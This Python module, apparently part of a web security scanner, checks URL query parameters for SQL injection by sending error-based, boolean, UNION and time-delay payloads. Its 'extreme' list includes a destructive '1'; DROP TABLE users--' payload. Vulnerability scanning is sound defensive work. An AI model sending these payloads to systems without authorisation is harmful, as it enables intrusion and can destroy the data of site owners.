"""Basic SQL injection detection via error-based and boolean signals."""

import re
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from ..models import Finding, FindingType, Severity


# Error-based and boolean payloads (safe, no data modification)
SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1 AND 1=1",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT pg_sleep(5)--",
    "1' ORDER BY 1--",
    "1' ORDER BY 9999--",
    "1 UNION SELECT NULL--",
]

# Extreme: obfuscated, encoded, and alternate syntax
SQLI_EXTREME_PAYLOADS = [
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "1' OR '1'='1' --",
    "1 OR 1=1",
    "' UNION SELECT NULL,NULL,NULL--",
    "1'; DROP TABLE users--",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' AND SLEEP(5)--",
    "\" AND SLEEP(5)--",
    "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "' OR ''='",
    "admin'--",
    "admin' #",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' UNION SELECT 1,2,3--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "%27%20OR%201=1--",
    "' OR 1=1-- -",
    "1; WAITFOR DELAY '0:0:5'--",
    "1 AND 1=0 UNION ALL SELECT 1,2,3,4,5--",
    "' AND '1'='1",
    "\" AND \"1\"=\"1",
    "1' AND (SELECT 0 FROM (SELECT SLEEP(5))a)--",
    "1\" AND (SELECT 0 FROM (SELECT SLEEP(5))a)--",
    "'; SELECT pg_sleep(5)--",
    "1' AND ASCII(SUBSTRING((SELECT version()),1,1))>0--",
]

# Patterns that may indicate SQL errors (information disclosure / injection point)
SQL_ERROR_PATTERNS = [
    re.compile(r"SQL syntax.*MySQL", re.I),
    re.compile(r"Warning.*mysql_", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
    re.compile(r"ORA-\d{5}", re.I),
    re.compile(r"SQLite.*error", re.I),
    re.compile(r"SQL Server.*Driver", re.I),
    re.compile(r"Unclosed quotation mark", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"syntax error.*sql", re.I),
    re.compile(r"invalid query", re.I),
]


def inject_payload(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))


def check_sqli(url: str, session: requests.Session | None = None, extreme: bool = False) -> list[Finding]:
    """Check for SQL injection in query parameters. If extreme, use many more payloads."""
    findings = []
    session = session or requests.Session()
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        return findings

    payloads = (SQLI_PAYLOADS + SQLI_EXTREME_PAYLOADS) if extreme else SQLI_PAYLOADS
    baseline = None
    try:
        baseline = session.get(url, timeout=10)
        baseline_text = baseline.text
    except requests.RequestException:
        return findings

    for param in list(params.keys()):
        for payload in payloads:
            try:
                test_url = inject_payload(url, param, payload)
                resp = session.get(test_url, timeout=10)
                text = resp.text
                for pattern in SQL_ERROR_PATTERNS:
                    if pattern.search(text) and (not baseline or not pattern.search(baseline_text)):
                        findings.append(Finding(
                            finding_type=FindingType.SQL_INJECTION,
                            severity=Severity.CRITICAL,
                            title="Possible SQL injection (error-based)",
                            description=f"Parameter '{param}' may be vulnerable. SQL error reflected in response.",
                            url=test_url,
                            evidence=pattern.pattern,
                            recommendation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
                            cwe_id="CWE-89",
                        ))
                        break
                else:
                    # Boolean-based: significant content change
                    if baseline and len(text) != len(baseline_text) and abs(len(text) - len(baseline_text)) > 100:
                        findings.append(Finding(
                            finding_type=FindingType.SQL_INJECTION,
                            severity=Severity.HIGH,
                            title="Possible SQL injection (boolean)",
                            description=f"Parameter '{param}' may be injectable; response length changed with payload.",
                            url=test_url,
                            evidence=f"Payload: {payload[:30]}...",
                            recommendation="Use parameterized queries. Verify manually.",
                            cwe_id="CWE-89",
                        ))
                        break
            except requests.RequestException:
                continue

    return findings
